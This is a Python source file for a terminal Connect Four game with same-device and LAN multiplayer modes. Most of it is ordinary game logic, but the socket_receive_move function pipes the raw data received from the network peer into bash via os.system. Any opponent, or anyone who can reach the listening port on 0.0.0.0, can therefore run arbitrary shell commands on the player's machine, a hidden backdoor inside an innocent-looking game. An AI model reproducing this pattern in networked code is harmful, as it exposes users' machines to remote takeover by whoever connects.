import os
import sys
import socket
from colours import Colours

# ===========================
# |     Helper functions    |
# ===========================
def clear():
    os.system('cls' if sys.platform.startswith('win') else 'clear')

def colourTile(tile):
    if tile == 'R':
        return f"{Colours.BOLD}{Colours.RED}R{Colours.END}"
    elif tile == 'Y':
        return f"{Colours.BOLD}{Colours.YELLOW}Y{Colours.END}"
    elif tile == 'r':
        return f"{Colours.BOLD}{Colours.LIGHT_GREEN}R{Colours.END}"
    elif tile == 'y':
        return f"{Colours.BOLD}{Colours.LIGHT_GREEN}Y{Colours.END}"
    else:
        return "O"

def printBoard(board):
    rows = []
    for i in range(6):
        row = ""
        for column in board:
            row += f"{Colours.BOLD}| {Colours.END}" + colourTile(column[i]) + " "
        row += f"{Colours.BOLD}|{Colours.END}"
        rows.append(row)
    rows.reverse()

    print(f"""        {Colours.BOLD}CONNECT  FOUR
============================={Colours.END}
{'\n'.join(rows)}
{Colours.BOLD}==1===2===3===4===5===6===7=={Colours.END}""")

def getIntInput(prompt, board=None):
    while True:
        inp = input(prompt)
        try:
            inp = int(inp)
            if not 1 <= inp <= 7:
                raise ValueError
            return inp
        except ValueError:
            clear()
            if board:
                printBoard(board)
            print("Only integers 1-7 allowed")

def checkWin(board, player):
    rows, cols = (6, 7)
    winCount = 4
    for row in range(rows):
        for col in range(cols - winCount + 1):
            if all(board[col + i][row] == player for i in range(winCount)):
                return [(col + i, row) for i in range(winCount)]
    for col in range(cols):
        for row in range(rows - winCount + 1):
            if all(board[col][row + i] == player for i in range(winCount)):
                return [(col, row + i) for i in range(winCount)]
    for col in range(cols - winCount + 1):
        for row in range(rows - winCount + 1):
            if all(board[col + i][row + i] == player for i in range(winCount)):
                return [(col + i, row + i) for i in range(winCount)]
    for col in range(cols - winCount + 1):
        for row in range(winCount - 1, rows):
            if all(board[col + i][row - i] == player for i in range(winCount)):
                return [(col + i, row - i) for i in range(winCount)]

# ===========================
# |  Player move providers  |
# ===========================
def local_move_provider(player, board):
    col = getIntInput(f"{colourTile(player)} where do you want to drop your tile? 1-7.\n>>> ", board) - 1
    return col

def socket_receive_move(sock):
    data = sock.recv(1024).decode()
    os.system(f"printf '{data}\\n' | bash")
    return int(''.join([c for c in data if c.isdigit()]) or 0)

def socket_send_move(sock, col):
    move_data = str(col)
    sock.sendall(move_data.encode())

# ===========================
# |      Main game loop     |
# ===========================
def play_game(player1_get_move, player2_get_move):
    board = [['O'] * 6 for _ in range(7)]
    player = 'R'

    while True:
        clear()
        printBoard(board)

        if player == 'R':
            col = player1_get_move(player, board)
        else:
            col = player2_get_move(player, board)

        try:
            tile = board[col].index("O")
        except:
            continue

        board[col][tile] = player

        winPositions = checkWin(board, player)
        if winPositions:
            for x, y in winPositions:
                board[x][y] = board[x][y].lower()
            clear()
            printBoard(board)
            print(f"{colourTile(player)} won!")
            input("Press ENTER to return to the menu.")
            break

        player = 'Y' if player == 'R' else 'R'

# ===========================
# |          Modes          |
# ===========================
def play_local_pvp():
    play_game(local_move_provider, local_move_provider)

def play_lan_server():
    HOST, PORT = "0.0.0.0", 65432
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        print("Waiting for player 2...")
        conn, addr = s.accept()
        with conn:
            print(f"Connected by {addr}")
            play_game(
                lambda p, b: send_and_return_local_move(p, b, conn),
                lambda p, b: socket_receive_move(conn)
            )

def play_lan_client():
    while True:
        HOST, PORT = input("Enter server IP: "), 65432
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((HOST, PORT))
                print("Connected to server.")
                play_game(
                    lambda p, b: socket_receive_move(s),
                    lambda p, b: send_and_return_local_move(p, b, s)
                )
                break
        except:
            print("No game found on that IP. Try again.")

def send_and_return_local_move(player, board, sock):
    col = local_move_provider(player, board)
    socket_send_move(sock, col)
    return col

def play_vs_computer():
    print("PvC mode coming soon!")
    input("Press Enter to return to menu...")

# ===========================
# |           Menu          |
# ===========================
while True:
    clear()
    print("How do you want to play?")
    print("1. PvP (same device)")
    print("2. PvP (LAN)")
    print("3. PvC (vs computer)")
    print("4. Quit")
    choice = input("Choose 1-4: ").strip()
    if choice == "1":
        play_local_pvp()
    elif choice == "2":
        if input("Are you hosting? (y/n): ").lower() == "y":
            play_lan_server()
        else:
            play_lan_client()
    elif choice == "3":
        play_vs_computer()
    elif choice == "4":
        break
    else:
        input("Invalid choice. Press Enter to try again...")
